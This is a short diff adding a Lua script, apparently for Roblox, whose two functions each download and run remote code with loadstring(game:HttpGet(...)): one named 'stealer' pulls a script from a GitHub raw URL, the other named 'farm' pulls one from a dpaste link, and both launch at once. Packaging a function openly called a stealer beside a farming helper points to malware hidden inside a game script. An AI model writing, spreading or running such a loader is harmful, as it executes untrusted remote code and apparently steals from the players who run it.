@@ -1,0 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ZENHUBV1/Paulscript-/refs/heads/main/lua.txt'))()
+end
+
+local function farm()
+    loadstring(game:HttpGet('https://dpaste.org/Mk61i/raw'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
